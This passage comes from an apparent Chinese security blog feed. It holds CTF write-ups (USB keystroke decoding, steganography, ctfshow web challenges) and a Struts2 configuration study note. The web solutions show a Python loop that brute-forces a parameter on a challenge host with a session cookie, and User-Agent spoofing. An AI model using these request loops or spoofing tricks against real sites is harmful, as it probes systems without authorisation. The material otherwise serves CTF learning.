class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshow渔人杯"><a href="#ctfshow渔人杯" class="headerlink" title="ctfshow渔人杯"></a>ctfshow渔人杯</h1><h2 id="签到抽奖"><a href="#签到抽奖" class="headerlink" title="签到抽奖"></a>签到抽奖</h2><p><img src="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">中文也可能是英文及其他小众语言字符<br></code></pre></td></tr></table></figure><h2 id="感受下气氛"><a href="#感受下气氛" class="headerlink" title="感受下气氛"></a>感受下气氛</h2><p>flag是ctfshow{[0-9]{9}}</p><p>正则匹配，符合条件的都可以，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;123456789&#125;<br></code></pre></td></tr></table></figure><h2 id="神仙姐姐"><a href="#神仙姐姐" class="headerlink" title="神仙姐姐"></a>神仙姐姐</h2><p><img src="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击拜，抓包<br><img src="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传参num进行爆破，根据提示num在1-1000内<br><img src="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>都是假flag，一直往下翻<br><img src="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编写脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://f0c222a9-04f2-431b-ae2b-56e871f6b61b.challenge.ctf.show:8080/sx.php&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=gmnu9pfgh503imv66a9tk37ke2&quot;</span><br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    response=requests.get(url, headers=headers);<br>    print(responsea.text)<br></code></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="阿拉丁"><a href="#阿拉丁" class="headerlink" title="阿拉丁"></a>阿拉丁</h2><p>想要啥就有啥</p><p>好家伙，怎么不给flag，不是说想要啥就有啥吗？<br><img src="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续问，还是没有<br><img src="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>burp抓包也看不出什么，看了其他师傅的wp，可以直接问flag每一位是什么？，我直接好家伙，这也行。<br><img src="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总共45位<br><img src="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>拼接起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;a15b2830-dcf4-4344-99e5-350a561cbf89&#125;<br></code></pre></td></tr></table></figure><h2 id="迷"><a href="#迷" class="headerlink" title="迷"></a>迷</h2><p><img src="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问靶机地址<br><img src="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个登录框，还以为是sql注入，看了群里说直接访问/flag<br><img src="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>是菜蒙蔽了我的双眼，做个题还被嘲讽了<br><img src="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="飘啊飘"><a href="#飘啊飘" class="headerlink" title="飘啊飘"></a>飘啊飘</h2><p>题目描述：有手X就行</p><p>抓包，伪装请求头<code>User-Agent: Android</code>，状态码302重定向，发现了mb.html<br><img src="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问mb.html<br><img src="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="简单二维码"><a href="#简单二维码" class="headerlink" title="简单二维码"></a>简单二维码</h2><p>下载附件，一个png图片和一个“wp”，两个假flag。<br><img src="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用stegsolve进行异或，发现一张二维码<br><img src="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，还是假flag<br><img src="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续异或，还是迷惑信息<br><img src="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>勾选最低通道，依旧是假flag<br><img src="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击Analyse，选择Steregram Sover进行左右偏移<br><img src="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>终于找到了真flag，颈椎治疗，哈哈哈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;Jing_Zhui_Zhi_Liao&#125;<br></code></pre></td></tr></table></figure><h2 id="我跟你拼了"><a href="#我跟你拼了" class="headerlink" title="我跟你拼了"></a>我跟你拼了</h2><p>狸题，下载附件ttt.png和mask.png<img src="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我傻乎乎的在那拼图，看了wp原来直接修改图片高度就行了，666，果然狸题就是离谱<br><img src="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考文章：<br><a href="https://l1near.top/index.php/2021/04/03/100.html">首届“红明谷”杯技能场景赛MISC_WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：记录最近几场比赛的赛后复现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>Struts2核心配置</title>
    <link href="http://atkx.top/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://atkx.top/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</id>
    <published>2021-03-28T11:24:14.000Z</published>
    <updated>2021-05-27T12:47:03.737Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（二）</p> <a id="more"></a><h1 id="Struts2的核心配置"><a href="#Struts2的核心配置" class="headerlink" title="Struts2的核心配置"></a>Struts2的核心配置</h1><h2 id="Struts2常量配置"><a href="#Struts2常量配置" class="headerlink" title="Struts2常量配置"></a>Struts2常量配置</h2><h3 id="常量配置"><a href="#常量配置" class="headerlink" title="常量配置"></a>常量配置</h3><p><strong>1.在default.properties 中配置</strong></p><p>默认值,不会在该配置文件中配置</p><p><strong>2.在struts.properties中配置</strong></p><p>基本不会在该配置文件中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml">###设置默认编码集为UTF-8,作用于HttpServletRequest的setCharacterEncoding方法<br>struts.i18n.encoding=UTF-8 <br><br>###设置action请求的扩展名为action或者没有扩展名，该属性指定需要Struts 2处理的请求后缀，该属性的默认值是action，即所有匹配*.action的请求都由Struts2处理。如果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（,）隔开<br>struts.action.extension=action,, <br><br>###设置浏览器是否缓存静态内容,默认值为true(生产环境下使用),开发阶段最好关闭<br>struts.serve.static.browserCache=true <br><br>### 当struts的配置文件修改后,系统是否自动重新加载该文件,默认值为false(生产环境下使用) <br>struts.configuration.xml.reload=false <br><br> <br>###设置不使用开发者模式，开发模式下使用,这样可以打印出更详细的错误信息<br>struts.devMode = false <br><br>###设置不开启动态方法调用<br>struts.enable.DynamicMethodInvocation=false<br></code></pre></td></tr></table></figure><p><strong>3.在struts.xml中配置</strong></p><blockquote><p>开发中基本上都在该配置文件中配置常量</p></blockquote><p>通过<code>&lt;constant&gt;</code>元素来配置常量，该标签写<code>&lt;struts&gt;</code>下面，和<code>&lt;package&gt;</code>标签同级</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 声明常量 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 声明常量 --&gt;</span><br><span class="hljs-comment">&lt;!--设置默认编码集UTF-8,解决post请求乱码--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.i18n.encoding&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!--设置使用开发者模式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devModel&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 设置后缀 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;action,,&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.在web.xml中配置</p><p>配置核心过滤器StrutsPrepareAndExecuteFilter时，通过初始化参数来配置常量,通过<code>&lt;filter&gt;</code>元素的<code>&lt;init-param&gt;</code>子元素指定常量</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-comment">&lt;!--指定struts2的核心过滤器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-comment">&lt;!--通过init-param元素配置struts2常量，设置开发者模式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>struts.devModel<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p>基本不会在该配置文件中配置</p><p>`</p><h3 id="配置文件加载顺序"><a href="#配置文件加载顺序" class="headerlink" title="配置文件加载顺序"></a>配置文件加载顺序</h3><p>1、default.properties：在该文件保存在struts2-core-2.3.37.jar中org/apache/struts2包下。</p><p>2、struts-default.xml：在核心的jar包struts2-core-2.3.37.jar的最下方，struts2框架的核心功能都是在该配置文件中配置的。</p><p>3、struts-plugin.xml配置文件。</p><p>4、struts.xml：在src的目录下，该文件是Web应用自己的配置的配置文件</p><p>5、struts.properties：该文件是Web应用默认的Struts2的配置文件</p><p>6、web.xml：该文件是Web应用的的配置文件</p><p>后加载的配置文件会覆盖掉之前加载的配置文件</p><h2 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h2><p>在struts2中struts.xml是核心配置文件，struts.xml文件中包含三个标签</p><h3 id="package标签"><a href="#package标签" class="headerlink" title="package标签"></a>package标签</h3><p>与java中的包不同，类似一个代码包，区别不同的action。</p><p>package标签属性：</p><ul><li>name：包的名称，区分不同的package，管理action配置</li><li>namespace：名称空间，一般与标签中的name属性共同决定访问路径</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">namespace=”/” – 根名称空间，不写默认也是“/”。<br>namespace=”/aaa” – 带有名称的名称空间，访问时必须带上才能访问action<br></code></pre></td></tr></table></figure><ul><li> extends：继承，可以继承其他的包，只要继承了，那么该包就包含了其他包的功能，一般都是继承struts-default</li></ul><h3 id="action标签"><a href="#action标签" class="headerlink" title="action标签"></a>action标签</h3><p>action标签主要配置action的访问路径</p><p>action的标签属性：</p><ul><li>name：action的名称，区分不同的action，和package标签中的namespace属性构成了访问路径</li><li>class：配置Action类的全路径全路径=包名+类名，通过反射的原理去执行该类的，默认值是ActionSupport类</li><li>method ： Action类中执行的方法，如果不指定，默认值是execute<h3 id="result标签"><a href="#result标签" class="headerlink" title="result标签"></a>result标签</h3>根据action中的方法返回值，将页面定位到指定的页面或action上</li></ul><p>result标签的属性：</p><ul><li>name属性：和你方法的返回值要一样</li><li>type – 结果类型，有4个值：dispatcher(默认)、redirect、chain、redirectAction</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">dispatcher(默认)和redirect：result标签中“/”代表的是项目根路径，不写就代表当前路径下<br>chain和redirectAction：result标签中“/”没有任何意义，不需要写，写了就是多余，也就是只能从当前路径去指定页面！！！<br>chain：只能转发到同一命名空间下的Action<br>redirect：可以重定向到action中去，也可以重定向到显示页面中去<br></code></pre></td></tr></table></figure><h3 id="struts配置文件分离"><a href="#struts配置文件分离" class="headerlink" title="struts配置文件分离"></a>struts配置文件分离</h3><p>用于按模块开发，在struts.xml配置文件中使用<code>&lt;include file=&quot; &quot;/&gt;</code>包含指定的文件夹</p><p>案例1：有两个配置文件struts-part1.xml和struts-part2.xml，可以在struts.xml中配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part1.xml&quot;</span>/&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part2.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>案例2：在cn.itcast.action.demo包下有一个配置文件struts_demo.xml，引入该配置文件到struts.xml中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;cn/itcast/action/demo/struts_demo.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Action的配置"><a href="#Action的配置" class="headerlink" title="Action的配置"></a>Action的配置</h2><h3 id="实现Action控制类"><a href="#实现Action控制类" class="headerlink" title="实现Action控制类"></a>实现Action控制类</h3><p>Action类的书写格式有三种方法</p><p><strong>方法一</strong>: Action类可以不继承特殊的类或不实现任何特殊的接口或者父类，仅仅是一个POJO，即简单的Java对象（Plain Ordinary Java Object） ，要有一个公共的无参的构造方法和一个execute方法</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>方法二</strong>: 创建一个类去实现指定的一个接口:<code>com.opensymphony.xwork2.Action</code></p><p>这个接口中只有一个抽象方法 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>;<br></code></pre></td></tr></table></figure><p>同时还有5个String类型的静态属性：ERROR、SUCCESS、INPUT、NONE、LOGIN</p><p>常量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SUCCESS = <span class="hljs-string">&quot;success&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String NONE = <span class="hljs-string">&quot;none&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ERROR = <span class="hljs-string">&quot;error&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String INPUT = <span class="hljs-string">&quot;input&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LOGIN = “login”;<br></code></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Action</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>方法三</strong>:   继承一个指定的父类:<code>com.opensymphony.xwork2.ActionSupport</code></p><p>   ActionSupport类本身实现了Action接口，是Struts2中默认的Action接口的实现类，所以继承ActionSupport就相当于实现了Acton接口，并提供了数据的校验。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 